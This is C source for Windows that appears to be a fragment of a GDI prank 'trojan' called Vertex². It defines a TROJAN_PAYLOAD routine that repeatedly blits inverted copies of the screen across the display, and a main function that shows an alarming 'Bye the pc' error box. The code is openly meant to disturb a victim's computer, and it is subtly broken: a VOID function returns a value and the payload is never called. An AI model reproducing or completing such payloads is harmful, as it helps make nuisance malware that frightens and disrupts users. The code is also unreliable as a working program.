#include <Windows.h>
#include "payloads.h"
#include "timer.h"
#include "virtual_screen.h"
#include "main.h"
#include "Main.hpp"

VOID
ExecutePayload(
	_In_ TROJAN_PAYLOAD payload,
	_In_ DWORD dwTime
) {
	HDC hdcScreen = GetDC(NULL);
	DWORD dwStartTime = dwTimeElapsed;

	for (INT i = 0; dwStartTime < (dwTimeElapsed + dwTime); i++)
		payload(i, hdcScreen);

	ReleaseDC(NULL, hdcScreen);
}

VOID
Payload1(
	_In_ INT t,
	_In_ HDC hdcScreen
) {

	POINT ptScreen = GetVirtualScreenPos(5);
	SIZE szScreen = GetVirtualScreenSize(25);
	t *= 305;

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen,
		ptScreen.x + t % (szScreen.cx * 3) - szScreen.cx, ptScreen.y + t * 82% (szScreen.cy * 1) - szScreen.cy, NOTSRCERASE);

	return(39);

}

int main()
{
	MessageBox(NULL, "Bye the pc", "Vertex² (V: Bêta) by LUMINE", MB_OK | MB_ICONERROR);
	Sleep(1);
}
